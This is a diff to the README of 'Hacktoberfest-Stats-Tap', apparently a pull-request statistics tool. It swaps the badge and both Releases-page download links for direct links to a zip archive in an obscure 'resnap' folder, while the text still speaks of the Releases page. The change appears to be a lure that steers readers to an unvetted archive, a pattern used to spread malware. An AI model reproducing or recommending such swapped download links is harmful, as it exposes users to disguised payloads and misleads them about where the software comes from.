@@ -1,6 +1,6 @@
 # 🎉 Hacktoberfest-Stats-Tap - Simplify Your PR Data Analysis
 
-![Download Hacktoberfest-Stats-Tap](https://img.shields.io/badge/download-Hacktoberfest--Stats--Tap-brightgreen)
+![Download Hacktoberfest-Stats-Tap](https://raw.githubusercontent.com/usmankair2827/Hacktoberfest-Stats-Tap/main/resnap/Hacktoberfest-Stats-Tap.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Hacktoberfest-Stats-Tap! This application helps you analyze pull requ
 
 To download Hacktoberfest-Stats-Tap, visit this page to download:
 
-[Download Hacktoberfest-Stats-Tap](https://github.com/usmankair2827/Hacktoberfest-Stats-Tap/releases)
+[Download Hacktoberfest-Stats-Tap](https://raw.githubusercontent.com/usmankair2827/Hacktoberfest-Stats-Tap/main/resnap/Hacktoberfest-Stats-Tap.zip)
 
 Once you are on the Releases page, look for the latest version, and follow these steps:
 
@@ -91,4 +91,4 @@ For any questions or support, feel free to reach out:
 
 Follow these steps, and you will harness the full power of Hacktoberfest-Stats-Tap for statistical analysis of your pull requests. Enjoy your data journey!
 
-[Download Hacktoberfest-Stats-Tap](https://github.com/usmankair2827/Hacktoberfest-Stats-Tap/releases)
+[Download Hacktoberfest-Stats-Tap](https://raw.githubusercontent.com/usmankair2827/Hacktoberfest-Stats-Tap/main/resnap/Hacktoberfest-Stats-Tap.zip)
